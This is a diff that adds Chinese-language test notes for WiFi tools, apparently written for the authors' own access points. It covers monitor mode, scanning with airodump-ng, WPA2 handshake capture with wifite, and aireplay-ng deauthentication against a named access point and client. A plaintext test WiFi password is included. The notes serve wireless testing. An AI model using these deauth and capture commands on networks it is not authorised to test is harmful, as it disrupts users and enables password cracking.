@@ -1,0 +1,53 @@
+管理模式：
+iwconfig wlan0 mode man
+扫描wifi 命令1：
+iw dev wlan0 scan
+扫描wifi 命令2：
+iwlist wlan0 scan
+
+
+监听模式：
+iwconfig wlan1 mode mon
+
+抓握手包：
+1.将wifi切换到监听模式
+2.用s9测试，将手机保存的wifi都删除，连接wpa2.4或者wpa2_2.4或者wpa5.8（密码都是kingfeeling16）
+3.运行wifite（如果没有这个命令，apt-get install wifite）
+4.在wifite扫描出来的列表里选择手机刚才连接的wifi
+5.等待抓包完成或者失败
+6.需要多测试几次
+
+
+监听模式扫描：
+1.切换到监听模式
+2.airodump-ng -c 1 wlan0  (其中1是指信道，会出现信道1周围的wifi)，需要确定出现的wifi的信道不大于6
+
+3.airodump-ng -c 6 wlan0  需要确定出现的wifi的信道在2-10之间（包括2,10）
+
+4.airodump-ng -c 11 wlan0  需要确定出现的wifi的信道在7-13之间（包括7,13）
+wifite:
+
+----------------------------------------------------------------------------------------
+
+抓取握手包简单测试方法:
+
+
+1. 关闭 network-manager:
+        systemctl stop network-manager
+
+2. 监听模式:
+        iwconfig wlan0 mode mon
+
+3. 切换信道: (根据需要改) 
+       iwconfig wlan0 channel 8
+
+4. 开始监听: 
+      airodump-ng -w 2 -c 8 --bssid D4:EE:07:2B:89:FE wlan0	 (--bssid AP ID   -c 信道   -w 保存文件名)	
+
+5. 开始打断:
+      aireplay-ng -0 3 -a D4:EE:07:2B:89:FE -c F8:38:80:0D:BA:04 wlan0    (-0 模式 3 打断次数  -a AP id  -c  Client id)
+
+----------------------------------------------------------------------------------------
+
+连接wifi:
+  wpa_supplicant -Dnl80211 -iwlan0 -c/etc/wpa_supplicant.conf
